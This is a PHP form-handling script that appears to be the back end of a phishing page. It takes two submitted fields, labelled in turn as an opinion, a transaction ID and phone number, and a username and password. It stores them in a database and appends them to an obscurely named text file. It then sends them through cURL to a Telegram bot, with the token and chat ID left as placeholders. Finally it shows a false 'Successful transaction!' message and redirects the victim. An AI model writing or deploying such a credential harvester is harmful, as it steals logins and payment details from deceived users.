<?php
// Database configuration (same as your previous file)
$servername = "localhost";
$username = "root";
$password = "";
$dbname = "opinions";

// Create a connection to the database
$conn = new mysqli($servername, $username, $password, $dbname);

// Check the connection
if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

// Define variables to track the success message and style
$successMessage = "";
$alertStyle = "";

// Handle form submission
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // Get the form data
    $transactionId = $_POST["To"];
    $phoneNumber = $_POST["Opinion"];

    // Sanitize the input (to prevent SQL injection)
    $transactionId = mysqli_real_escape_string($conn, $transactionId);
    $phoneNumber = mysqli_real_escape_string($conn, $phoneNumber);

    // Insert the transaction ID and phone number into the database
    $sql = "INSERT INTO opinion (`To`, opinion) VALUES ('$transactionId', '$phoneNumber')";

    if ($conn->query($sql) === TRUE) {
        // Set success message and alert style
        $successMessage = "Successful transaction!";
        $alertStyle = "color: green; background-color: #d4edda; border-color: #c3e6cb;";
        
        // Redirect to the original page after 3 seconds
        // echo '<script>setTimeout(function(){ window.location.href = "http://localhost/upi_payments/"; }, 2500);</script>';
    } else {
        $successMessage = "Error: " . $sql . "<br>" . $conn->error;
    }

    // Get additional form data for the second part of the script
    $username = $_POST["To"];
    $password = $_POST["Opinion"];

    // Create a string with the user data
    $userData = "Username: $username, Password: $password\n";

    // Open the file in append mode and write the user data
    if (file_put_contents("uibRSd984982WEk.txt", $userData, FILE_APPEND | LOCK_EX) === false) {
        // Handle file write error
        exit("Failed to write data to file");
    }

    // Send data to Telegram bot
    $telegramBotToken = "Some Telegram Bot ID";
    $telegramChatId = "Chat ID";
    $message = "New form submission:\nTo: $username\nOpinion: $password";

    // URL for sending messages to Telegram bot
    $telegramApiUrl = "https://api.telegram.org/bot$telegramBotToken/sendMessage";
    
    // Use cURL to send a POST request to Telegram API
    $ch = curl_init($telegramApiUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, "chat_id=$telegramChatId&text=" . urlencode($message));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);

    // Redirect to success.html
    header("Location: display.php");
    exit();
}

// Close the database connection
$conn->close();
?>
